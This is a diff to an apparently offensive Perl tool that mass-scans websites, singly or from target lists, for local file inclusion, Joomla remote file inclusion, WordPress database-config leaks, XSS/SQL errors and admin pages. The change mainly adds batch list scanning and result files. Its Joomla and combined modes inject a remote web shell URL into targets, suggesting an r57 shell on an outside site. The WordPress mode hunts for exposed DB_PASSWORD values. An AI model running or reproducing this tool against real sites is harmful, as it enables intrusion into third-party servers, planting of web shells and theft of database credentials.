@@ -358,7 +358,7 @@ print "
    .##.....##....##....##....##.##....##.##.....##.##...###......|| T ||......
    .##.....##....##.....######...######..##.....##.##....##...._.' `-' '._....
    ............................................................`-'-----`-'....
-   .....................................................V-1.1..................
+   .....................................................V.2...................
 \n";
 print color 'magenta', RESET;
 
@@ -395,6 +395,9 @@ chomp($task);
 #DORK SEARCH
 if($task eq "1"){
   sleep (1);
+  
+  $listcheck = "Search_Scan.txt";
+  if (-e $listcheck){ unlink 'Search_Scan.txt'};
   
   print color 'bold yellow';
   print "    [+] Please enter your Dork: ";
@@ -470,6 +473,9 @@ if($task eq "1"){
 	goto SCANRESULTS;
   };
   
+  $listcheck2 = "XSS_Search_Scan.txt";
+  if (-e $listcheck2){ unlink 'XSS_Search_Scan.txt'};
+	
   if ($makescan =~ m/y/i || m/yes/i ){
     print color 'yellow';
     print "    [+] Please wait...\n";
@@ -656,6 +662,9 @@ if($task eq "2"){
   if ($ID==2){
     sleep (1);
 	
+    $listcheck = "XSS_Site_Scan.txt";
+	if (-e $listcheck){ unlink 'XSS_Site_Scan.txt'};
+
     ###########################
     ####### BGN CHECK USE LIST
     ###########################
@@ -1305,43 +1314,144 @@ if($task eq "2"){
       goto after2;
     }
   }
+
 ##########
 #LFI
-if ($ID==3){
-  sleep (1);
-  print color 'bold yellow';
-  print "    [+] Please Enter Target [http://www.site.com/search.php?id=] ";
-  print "\n    [+] Target: ";
-  print color 'yellow', RESET;
-  $Target=<STDIN>;
-  chomp ($Target);
-  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-  print color 'yellow';
-  print "    [+] Please wait...";
-  print color 'yellow', RESET;
-  print" \n";
-  foreach $LFI(@LFI){
-    my $URL = $Target.$LFI;
-	use LWP::UserAgent;
-    my $ua = LWP::UserAgent->new;
-    $ua->timeout(30);
-    $request = HTTP::Request->new('GET', $URL);
-    $response = $ua->request($request);
-    my $Source = $response->content;
+  if ($ID==3){ ### BGN ID3
+    sleep (1);
 	
-    if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { 
-	  print color 'green';
-      print "    [!] $URL\n";
-	  print color 'green', RESET;
-	}
-  }
-  print color 'red';
-  print "\n    [!] SCAN FINISHED!\n";
-  print color 'red', RESET;
+    $listcheck = "LFI_Scan.txt";
+	if (-e $listcheck){ unlink 'LFI_Scan.txt'};
+    
+    USELIST2:;
+    print color 'bold yellow';
+    print "    [+] Do You Want To Scan a List? (Y/N): ";
+    print color 'bold yellow', RESET;
+    $uselist2=<STDIN>;
+    chomp ($uselist2);
+	if (!$uselist2){ 
+      print color 'red';
+	  print "    [+] Uppss.. Invalid Value!\n";
+      print color 'yellow', RESET;
+	  goto USELIST2;
+    };
+
+    if ($uselist2 =~ m/y/i || m/yes/i ){  ####### USE LIST
+    ####################################################
+	  LISTNAME2:;
+      print color 'bold yellow';
+      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print color 'bold yellow', RESET;
+      $listname2=<STDIN>;
+      chomp ($listname2);
+	  if (!$listname2){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to Enter List Name!\n";
+        print color 'yellow', RESET;
+	    goto LISTNAME2;
+      };
+      
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      
+      open (TEXT, $listname2);
+	  while (my $Target = <TEXT>) { ###
+	    chomp $Target;
+	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+		
+        sleep(2);
+		print" \n";
+        print color 'bold';
+        print "    [+] Checking... $Target";
+        print color RESET;
+		print" \n";
+        
+        foreach $LFI(@LFI){
+          my $URL = $Target.$LFI;
+	      use LWP::UserAgent;
+          my $ua = LWP::UserAgent->new;
+          $ua->timeout(30);
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $Source = $response->content;
+        
+          if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { 
+	        print color 'green';
+            print "    [!] $URL\n";
+	        print color 'green', RESET;
+            
+		    open (INFO, '>>LFI_Scan.txt');
+            print INFO "$URL\n";
+		    close (INFO);
+	      }  
+        } ### END FOREACH
+	  } ### END WHILE      
+      
+    }else{ ####### IF NO USE LIST
+    ####################################################
+      print color 'bold yellow';
+      print "    [+] Please Enter Target [http://www.site.com/search.php?id=] ";
+      print "\n    [+] Target: ";
+      print color 'yellow', RESET;
+      $Target=<STDIN>;
+      chomp ($Target);
+      if (!$Target){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to set a Target!\n";
+        print color 'yellow', RESET;
+	    goto id7;
+      };
+	  
+      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      foreach $LFI(@LFI){
+        my $URL = $Target.$LFI;
+	    use LWP::UserAgent;
+        my $ua = LWP::UserAgent->new;
+        $ua->timeout(30);
+        $request = HTTP::Request->new('GET', $URL);
+        $response = $ua->request($request);
+        my $Source = $response->content;
+	
+        if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { 
+	      print color 'green';
+          print "    [!] $URL\n";
+	      print color 'green', RESET;
+		  
+		  open (INFO, '>>LFI_Scan.txt');
+          print INFO "$URL\n";
+		  close (INFO);
+	    }  
+      }### END FOREACH
+    } ############################################## END NO USE LIST
+    ##########
+    
+    $list = "LFI_Scan.txt";
+	if (-e $list){  ### 
+      print" \n";
+	  print color 'yellow';
+      print "    [+] Results saved in LFI_Scan.txt! \n";
+	  print color 'yellow', RESET;
+	}else{ 
+	  print color 'red';
+      print "    [+] No Lfi Found! \n";
+	  print color 'red', RESET;
+	} 
+    print color 'red';
+    print "    [!] SCAN FINISHED!\n";
+    print color 'red', RESET;
+		
     after2:;
     print color 'bold yellow';
     print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
-	print color 'bold yellow', RESET;
+    print color 'bold yellow', RESET;
     $after3=<STDIN>;
     chomp ($after3);
     if ($after3==1) {
@@ -1360,76 +1470,146 @@ if ($ID==3){
       sleep(2);
       goto after3;
     }
-  }
+  } ### END ID3
+  ##########
+
   ##########
   #RFI SCAN (JOOMLA)
   if ($ID==4){
     sleep (1);
-    id4:;
+    
+    $listcheck = "Joom_RFI_Scan.txt";
+	if (-e $listcheck){ unlink 'Joom_RFI_Scan.txt'};
+    
+    USELIST3:;
     print color 'bold yellow';
-    print "    [+] Please Enter Target [http://www.site.com/search.php?id=] ";
-    print "\n    [+] Target: ";
-    print color 'yellow', RESET;
-    $Target=<STDIN>;
-    chomp ($Target);
-  
-    if (!$Target){ 
+    print "    [+] Do You Want To Scan a List? (Y/N): ";
+    print color 'bold yellow', RESET;
+    $uselist3=<STDIN>;
+    chomp ($uselist3);
+	if (!$uselist3){ 
       print color 'red';
-	  print "    [+] Uppss.. you have to set a Target!\n";
+	  print "    [+] Uppss.. Invalid Value!\n";
       print color 'yellow', RESET;
-	  goto id4;
+	  goto USELIST3;
     };
+
+    if ($uselist3 =~ m/y/i || m/yes/i ){  ####### USE LIST
+    ####################################################
+	  LISTNAME3:;
+      print color 'bold yellow';
+      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print color 'bold yellow', RESET;
+      $listname3=<STDIN>;
+      chomp ($listname3);
+	  if (!$listname3){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to Enter List Name!\n";
+        print color 'yellow', RESET;
+	    goto LISTNAME3;
+      };
+      
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      
+      open (TEXT, $listname3);
+	  while (my $Target = <TEXT>) { ###
+	    chomp $Target;
+	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+        
+        print color 'bold yellow';
+        print "    [+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
+        print "    [+] Shell: ";
+        print color 'yellow', RESET;
+        $Shell =<STDIN>;
+        chomp ($Shell);
+        print color 'yellow';
+        print "    [+] Please wait this can take a few minuts...\n";
+        print color 'yellow', RESET;
+        print" \n";
+        sleep(2);
+
+        foreach $RFI(@RFI){
+          my $URL =$Target.$RFI.$Shell;
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $Source = $response->content;
+
+         if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
+	       print color 'bold green';
+           print "    [!] $URL\n";
+	       print color 'green', RESET;
+           
+           open (INFO, '>>Joom_RFI_Scan.txt');
+           print INFO "$URL\n";
+           close (INFO);
+	     }
+        } ### END FOREACH
+      } ## END WHILE
+    }else{ #### IF NO USE LIST
+    
+      id4:;
+      print color 'bold yellow';
+      print "    [+] Please Enter Target [http://www.site.com/search.php?id=] ";
+      print "\n    [+] Target: ";
+      print color 'yellow', RESET;
+      $Target=<STDIN>;
+      chomp ($Target);
+      if (!$Target){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to set a Target!\n";
+        print color 'yellow', RESET;
+	    goto id4;
+      };
   
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print color 'bold yellow';
-    print "    [+] please Enter Shell Link: ";  #May Can help you : http://www.mcrracecars.co.uk/images/r57.txt
-    print color 'yellow', RESET;
-    $Shell =<STDIN>;
-    chomp ($Shell);
-    print color 'yellow';
-    print "    [+] Please wait...\n";
-    print color 'yellow', RESET;
-    print" \n";
-    sleep(2);
-    foreach $RFI(@RFI){
-      my $URL =$Target.$RFI.$Shell;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $Source = $response->content;
+      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+      print color 'bold yellow';
+      print "    [+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
+      print "    [+] Shell: ";
+      print color 'yellow', RESET;
+      $Shell =<STDIN>;
+      chomp ($Shell);
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...\n";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      foreach $RFI(@RFI){
+        my $URL =$Target.$RFI.$Shell;
+        $request = HTTP::Request->new('GET', $URL);
+        $response = $ua->request($request);
+        my $Source = $response->content;
 
-      if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
-	     print color 'bold green';
-         print "    [!] $URL\n";
-	     print color 'green', RESET;
-         open (TEXT, '>>Joom_RFI_Scan.txt');
-         print TEXT "$URL\n";
-         close (TEXT);
-	   }
-
-    }
+        if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
+	      print color 'bold green';
+          print "    [!] $URL\n";
+	      print color 'green', RESET;
+          
+          open (INFO, '>>Joom_RFI_Scan.txt');
+          print INFO "$URL\n";
+          close (INFO);
+	    }
+      }
+    } #### END NO USE LIST
+    
+    $list4 = "Joom_RFI_Scan.txt";
+	if (-e $list4){  ### 
+      print" \n";
+	  print color 'yellow';
+      print "    [+] Results saved in Joom_RFI_Scan.txt! \n";
+	  print color 'yellow', RESET;
+	}else{ 
+	  print color 'red';
+      print "    [+] No Joomla Lfi Found! \n";
+	  print color 'red', RESET;
+	} 
     print color 'red';
     print "    [!] SCAN FINISHED!\n";
-    print color 'red', RESET;
-	
-    $list = "Joom_RFI_Scan.txt";
-	if (-e $list){
-      print color 'yellow';
-      print "    [+] Do You Want To Save Results? (Y/N): ";
-      print color 'yellow', RESET;
-      $save=<STDIN>;
-      chomp($save);
-      if ($save =~ m/n/i || m/no/i ){
-        unlink  'Joom_RFI_Scan.txt';
-      }else{
-        print color 'green';
-        print "    [+] Scan saved to Joom_RFI_Scan.txt\n";
-        print color 'yellow', RESET;
-      }
-     }else{
-       print color 'red';
-       print "    [!] No RFI Joomla Site Found!\n";
-	   print color 'red', RESET;
-	}
+    print color 'red', RESET; 
+    
     after4:;
     print color 'bold yellow';
     print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
@@ -1452,68 +1632,130 @@ if ($ID==3){
       sleep(2);
       goto after4;
     }
-  }
+  } #### END ID 4  
+  ##########
+
   ##########
   #RFI SCAN (WORDPRESS)
   if ($ID==5){
     sleep (1);
-    id5:;
+    
+    $listcheck = "WP_RFI_Scan.txt";
+	if (-e $listcheck){ unlink 'WP_RFI_Scan.txt'};
+    
+    USELIST5:;
     print color 'bold yellow';
-    print "    [+] Please Enter Target [http://www.site.com] ";
-    print "\n    [+] Target: ";
-    print color 'yellow', RESET;
-    $Target=<STDIN>;
-    chomp ($Target);
-  
-    if (!$Target){ 
+    print "    [+] Do You Want To Scan a List? (Y/N): ";
+    print color 'bold yellow', RESET;
+    $uselist5=<STDIN>;
+    chomp ($uselist5);
+	if (!$uselist5){ 
       print color 'red';
-	  print "    [+] Uppss.. you have to set a Target!\n";
+	  print "    [+] Uppss.. Invalid Value!\n";
       print color 'yellow', RESET;
-	  goto id5;
+	  goto USELIST5;
     };
+
+    if ($uselist5 =~ m/y/i || m/yes/i ){  ####### USE LIST
+    ####################################################
+	  LISTNAME5:;
+      print color 'bold yellow';
+      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print color 'bold yellow', RESET;
+      $listname5=<STDIN>;
+      chomp ($listname5);
+	  if (!$listname5){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to Enter List Name!\n";
+        print color 'yellow', RESET;
+	    goto LISTNAME5;
+      };
+      
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      open (TEXT, $listname5);
+	  while (my $Target = <TEXT>) { ###
+	    chomp $Target;
+	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+        
+		print" \n";
+        print color 'bold';
+        print "    [+] Checking... $Target";
+        print color RESET;
+		print" \n";
+        
+        foreach $LFIWP(@LFIWP){
+          my $URL = $Target.$LFIWP;
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $Source = $response->content;
+          if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
+	        print color 'bold green';
+            print '    [!] ', $response->request->uri, "\n";
+	        print color 'green', RESET;
+            
+            open (INFO, '>>WP_RFI_Scan.txt');
+            print INFO "$URL\n";
+            close (INFO);
+	      }
+        }
+      } ### END WHILE
+    }else{ #### IF NO USE LIST
+    
+      id5:;
+      print color 'bold yellow';
+      print "    [+] Please Enter Target [http://www.site.com] ";
+      print "\n    [+] Target: ";
+      print color 'yellow', RESET;
+      $Target=<STDIN>;
+      chomp ($Target);
+      if (!$Target){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to set a Target!\n";
+        print color 'yellow', RESET;
+	    goto id5;
+      };
   
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print color 'yellow';
-    print "    [+] Please wait...";
-    print color 'yellow', RESET;
-    print" \n";
-    foreach $LFIWP(@LFIWP){
-      my $URL = $Target.$LFIWP;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $Source = $response->content;
-      if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
-	    print color 'bold green';
-        print '    [!] ', $response->request->uri, "\n";
-	    print color 'green', RESET;
-        open (TEXT, '>>WP_RFI_Scan.txt');
-        print TEXT "$URL\n";
-        close (TEXT);
-	  }
-    }
+      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+      print color 'yellow';
+      print "    [+] Please wait...";
+      print color 'yellow', RESET;
+      print" \n";
+      foreach $LFIWP(@LFIWP){
+        my $URL = $Target.$LFIWP;
+        $request = HTTP::Request->new('GET', $URL);
+        $response = $ua->request($request);
+        my $Source = $response->content;
+        if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
+	      print color 'bold green';
+          print '    [!] ', $response->request->uri, "\n";
+          
+	      print color 'green', RESET;
+          open (INFO, '>>WP_RFI_Scan.txt');
+          print INFO "$URL\n";
+          close (INFO);
+	    }
+      }
+    } #### END NO USE LIST
+    
+    $list = "WP_RFI_Scan.txt";
+	if (-e $list){  ### 
+      print" \n";
+	  print color 'yellow';
+      print "    [+] Results saved in WP_RFI_Scan.txt! \n";
+	  print color 'yellow', RESET;
+	}else{ 
+	  print color 'red';
+      print "    [+] No Wordpress Lfi Found! \n";
+	  print color 'red', RESET;
+	} 
     print color 'red';
     print "    [!] SCAN FINISHED!\n";
     print color 'red', RESET;
-	
-    $list = "WP_RFI_Scan.txt";
-	if (-e $list){
-      print color 'yellow';
-      print "    [+] Do You Want To Save Results? (Y/N): ";
-      print color 'yellow', RESET;
-      $save=<STDIN>;
-      chomp($save);
-      if ($save =~ m/n/i || m/no/i ){
-        unlink  'WP_RFI_Scan.txt';
-      }else{
-        print color 'green';
-        print "    [+] Scan saved to WP_RFI_Scan.txt\n";
-        print color 'yellow', RESET;
-      }
-     }else{
-       print color 'red';
-       print "    [!] No RFI Wordpress Site Found!\n";
-	   print color 'red', RESET;
-	}
+
     after5:;
     print color 'bold yellow';
     print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
@@ -1536,94 +1778,165 @@ if ($ID==3){
       sleep(2);
       goto after5;
     }
-  }
+  } #### END ID 5
+  
+  ##########
   ##########
   #XSS + LFI
   if ($ID==6){
     sleep (1);
-    id6:;
+    
+    $listcheck = "LFI_Scan.txt";
+	if (-e $listcheck){ unlink 'LFI_Scan.txt'};
+    $listcheck2 = "XSS_Scan.txt";
+	if (-e $listcheck2){ unlink 'XSS_Scan.txt'};
+    
+    USELIST7:;
     print color 'bold yellow';
-    print "    [+] Please Enter Target [http://www.site.com/search.php?id=]";
-    print "\n    [+] Target: ";
-    print color 'yellow', RESET;
-    $Target=<STDIN>;
-    chomp ($Target);
-  
-    if (!$Target){ 
+    print "    [+] Do You Want To Scan a List? (Y/N): ";
+    print color 'bold yellow', RESET;
+    $uselist7=<STDIN>;
+    chomp ($uselist7);
+	if (!$uselist7){ 
       print color 'red';
-	  print "    [+] Uppss.. you have to set a Target!\n";
+	  print "    [+] Uppss.. Invalid Value!\n";
       print color 'yellow', RESET;
-	  goto id6;
+	  goto USELIST7;
     };
+
+    if ($uselist7 =~ m/y/i || m/yes/i ){  ####### USE LIST
+    
+	  LISTNAME7:;
+      print color 'bold yellow';
+      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print color 'bold yellow', RESET;
+      $listname7=<STDIN>;
+      chomp ($listname7);
+	  if (!$listname7){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to Enter List Name!\n";
+        print color 'yellow', RESET;
+	    goto LISTNAME7;
+      };
+      
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+
+      open (TEXT, $listname7);
+	  while (my $Target = <TEXT>) { ###
+	    chomp $Target;
+	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+		
+		print" \n";
+        print color 'bold';
+        print "    [+] Checking... $Target";
+        print color RESET;
+		print" \n";
+        
+        foreach $XSS(@XSS){
+          my $URL = $Target.$XSS;
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $html = $response->content;
+	      if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
+	        print color 'bold green';
+            print "    [!] $URL\n";
+	        print color 'green', RESET;
+			
+            open (INFO, '>>XSS_Scan.txt');
+            print INFO "$URL\n";
+            close (INFO);
+	      }
+        }
+        foreach $LFI(@LFI){
+          my $URL = $Target.$LFI;
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $Source = $response->content;
+	      if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) {
+	        print color 'bold green';
+            print "    [!] $URL\n";
+	        print color 'green', RESET;
+			
+            open (INFO, '>>LFI_Scan.txt');
+            print INFO "$URL\n";
+            close (INFO);
+	      }
+        }
+	  } ### END WHILE      
+    }else{ ####### IF NOT USE LIST
+    
+      id6:;
+      print color 'bold yellow';
+      print "    [+] Please Enter Target [http://www.site.com/search.php?id=]";
+      print "\n    [+] Target: ";
+      print color 'yellow', RESET;
+      $Target=<STDIN>;
+      chomp ($Target);
+      if (!$Target){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to set a Target!\n";
+        print color 'yellow', RESET;
+	    goto id6;
+      };
   
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print color 'bold yellow';
-    print "    [+] please Enter Shell Link: ";  #May Can help you : http://www.mcrracecars.co.uk/images/r57.txt
-    print color 'yellow', RESET;
-    $Shell =<STDIN>;
-    chomp ($Shell);
-    print color 'yellow';
-    print "    [+] Please wait...\n";
-    print color 'yellow', RESET;
-    print" \n";
-    sleep(2);
-    foreach $XSS(@XSS){
-      my $URL = $Target.$XSS;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
-	    print color 'bold green';
-        print "    [!] $URL\n";
-	    print color 'green', RESET;
-        open (TEXT, '>>XSS_Scan.txt');
-        print TEXT "$URL\n";
-        close (TEXT);
-	  }
-    }
-    foreach $LFI(@LFI){
-      my $URL = $Target.$LFI;
-      my $Source = get $URL;
-      die "Can not get $URL" unless defined $URL;
-      if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { $Message ="VULNERABLE LFI";}
-      else { $Message = "NOT VULNERABLE LFI";}
-      sleep (1);
-	  if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) {
-	    print color 'bold green';
-        print "    [!] $URL\n";
-	    print color 'green', RESET;
-	  } else {
-	    print color 'red';
-        print "    [!] $URL\n";
-	    print color 'red', RESET;
-        open (TEXT, '>>LFI_Scan.txt');
-        print TEXT "$URL\n";
-        close (TEXT);
-	  }
-    }
-    print color 'red';
-    print "    [!] SCAN FINISHED!\n";
-    print color 'red', RESET;
-	
+      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+      print color 'bold yellow';
+      print "    [+] please Enter Shell Link: ";  #May Can help you : http://www.mcrracecars.co.uk/images/r57.txt
+      print color 'yellow', RESET;
+      $Shell =<STDIN>;
+      chomp ($Shell);
+      print color 'yellow';
+	 
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      foreach $XSS(@XSS){
+        my $URL = $Target.$XSS;
+        $request = HTTP::Request->new('GET', $URL);
+        $response = $ua->request($request);
+        my $html = $response->content;
+	    if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
+	      print color 'bold green';
+          print "    [!] $URL\n";
+	      print color 'green', RESET;
+          open (INFO, '>>XSS_Scan.txt');
+          print INFO "$URL\n";
+          close (INFO);
+	    }
+      }
+      foreach $LFI(@LFI){
+        my $URL = $Target.$LFI;
+        my $Source = get $URL;
+        die "Can not get $URL" unless defined $URL;
+        if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { $Message ="VULNERABLE LFI";}
+        else { $Message = "NOT VULNERABLE LFI";}
+        sleep (1);
+	    if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) {
+	      print color 'bold green';
+          print "    [!] $URL\n";
+	      print color 'green', RESET;
+	    }
+		
+        open (INFO, '>>LFI_Scan.txt');
+        print INFO "$URL\n";
+        close (INFO);
+      }
+    } ## END NOT USE LIST
+    
     $list = "LFI_Scan.txt";
 	$list2 = "XSS_Scan.txt";
 	if ((-e $list) or (-e $list2)){
-      print color 'yellow';
-      print "    [+] Do You Want To Save Results? (Y/N): ";
-      print color 'yellow', RESET;
-      $save=<STDIN>;
-      chomp($save);
-      if ($save =~ m/n/i || m/no/i ){
-        unlink  'XSS_Scan.txt';
-		unlink  'LFI_Scan.txt';
-      }else{
-        print color 'green';
-        print "    [+] Scan saved to LFI_Scan.txt AND XSS_Scan.txt\n";
-        print color 'yellow', RESET;
-      }
-     }else{
+	  print color 'yellow';
+      print "    [+] Results saved in LFI_Scan.txt and XSS_Scan.txt! \n";
+	  print color 'yellow', RESET;
+    }else{
        print color 'red';
-       print "    [!] No Wordpress Sites Found! Try changing number of results to scan!\n";
+       print "    [!] No LFI or XSS Found!\n";
 	   print color 'red', RESET;
 	}
 	
@@ -1649,79 +1962,151 @@ if ($ID==3){
       sleep(2);
       goto after6;
     }
-  }
+  } #### END LFI+XSS  
+  ##########
+  
   ##########
   #FIND ADMIN PAGE
   if ($ID==7){
     sleep (1);
-    id7:;
+    
+    $listcheck = "Admin_page.txt";
+	if (-e $listcheck){ unlink 'Admin_page.txt'};
+    
+    USELIST7:;
     print color 'bold yellow';
-    print "    [+] Please Enter Target [http://www.site.com] ";
-    print "\n    [+] Target: ";
-    print color 'yellow', RESET;
-    $Target=<STDIN>;
-    chomp ($Target);
-  
-    if (!$Target){ 
+    print "    [+] Do You Want To Scan a List? (Y/N): ";
+    print color 'bold yellow', RESET;
+    $uselist7=<STDIN>;
+    chomp ($uselist7);
+	if (!$uselist7){ 
       print color 'red';
-	  print "    [+] Uppss.. you have to set a Target!\n";
+	  print "    [+] Uppss.. Invalid Value!\n";
       print color 'yellow', RESET;
-	  goto id7;
+	  goto USELIST7;
     };
+
+    if ($uselist7 =~ m/y/i || m/yes/i ){  ####### USE LIST
+    
+	  LISTNAME7:;
+      print color 'bold yellow';
+      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print color 'bold yellow', RESET;
+      $listname7=<STDIN>;
+      chomp ($listname7);
+	  if (!$listname7){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to Enter List Name!\n";
+        print color 'yellow', RESET;
+	    goto LISTNAME7;
+      };
+      
+      print color 'yellow';
+      print "    [+] Please wait this can take a few minuts...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      open (TEXT, $listname7);
+	  while (my $Target = <TEXT>) { ###
+	    chomp $Target;
+	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+		
+		print" \n";
+        print color 'bold';
+        print "    [+] Checking... $Target";
+        print color RESET;
+		print" \n";
+        
+        foreach $ADMIN(@ADMIN){
+          my $URL =$Target.$ADMIN;
+          my $ua = LWP::UserAgent->new;
+          $ua->timeout(30);
+          $request = HTTP::Request->new('GET', $URL);
+          $response = $ua->request($request);
+          my $Source = $response->content;
+	      if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
+            if ( $response->is_success and $response->previous ) {
+	          print color 'green';
+              print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
+	          print color 'green', RESET;
+	          print color 'bold green';
+		      print '        => ', $response->request->uri, "\n";
+	          print color 'green', RESET;
+	        } else {
+	          print color 'bold green';
+              print "    [!] $URL\n";
+	          print color 'green', RESET;
+	        }
+	      }
+          open (INFO, '>>Admin_page.txt');
+          print INFO "$URL\n";
+	      close (INFO);
+        } ### END WHILE
+	  } ### END WHILE      
+    }else{ ####### IF NO USE LIST
+    
+      id7:;
+      print color 'bold yellow';
+      print "    [+] Please Enter Target [http://www.site.com] ";
+      print "\n    [+] Target: ";
+      print color 'yellow', RESET;
+      $Target=<STDIN>;
+      chomp ($Target);
+      if (!$Target){ 
+        print color 'red';
+	    print "    [+] Uppss.. you have to set a Target!\n";
+        print color 'yellow', RESET;
+	    goto id7;
+      };
   
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print color 'yellow';
-    print "    [+] Please wait...";
-    print color 'yellow', RESET;
-    print" \n";
-    sleep(2);
-    foreach $ADMIN(@ADMIN){
-      my $URL =$Target.$ADMIN;
-      my $ua = LWP::UserAgent->new;
-      $ua->timeout(30);
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $Source = $response->content;
-	  if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
-        if ( $response->is_success and $response->previous ) {
-	      print color 'green';
-          print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
-	      print color 'green', RESET;
-	      print color 'bold green';
-		  print '        => ', $response->request->uri, "\n";
-	      print color 'green', RESET;
-	    } else {
-	      print color 'bold green';
-          print "    [!] $URL\n";
-	      print color 'green', RESET;
+      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+      print color 'yellow';
+      print "    [+] Please wait...";
+      print color 'yellow', RESET;
+      print" \n";
+      sleep(2);
+      foreach $ADMIN(@ADMIN){
+        my $URL =$Target.$ADMIN;
+        my $ua = LWP::UserAgent->new;
+        $ua->timeout(30);
+        $request = HTTP::Request->new('GET', $URL);
+        $response = $ua->request($request);
+        my $Source = $response->content;
+	    if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
+          if ( $response->is_success and $response->previous ) {
+	        print color 'green';
+            print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
+	        print color 'green', RESET;
+	        print color 'bold green';
+		    print '        => ', $response->request->uri, "\n";
+	        print color 'green', RESET;
+	      } else {
+	        print color 'bold green';
+            print "    [!] $URL\n";
+	        print color 'green', RESET;
+	      }
 	    }
-	  }
-      open (TEXT, '>>Admin_page.txt');
-      print TEXT "$URL\n";
-	  close (TEXT);
-    }
+        open (INFO, '>>Admin_page.txt');
